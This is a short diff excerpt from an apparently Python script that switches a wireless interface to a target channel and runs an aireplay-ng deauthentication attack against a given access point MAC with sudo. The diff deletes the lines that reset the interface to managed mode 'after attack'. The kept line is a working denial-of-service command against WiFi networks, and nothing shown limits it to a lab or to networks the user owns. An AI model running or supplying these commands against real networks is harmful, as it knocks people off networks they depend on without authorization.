@@ -39,8 +39,3 @@ sudo_exec(f"iwconfig {interface} channel {target_channel}")
 # wlan0 : Network interface to use
 
 sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")
-
-# RESET interface after attack
-sudo_exec(f"ifconfig {interface} down")
-sudo_exec(f"iwconfig {interface} mode managed")
-sudo_exec(f"ifconfig {interface} up")
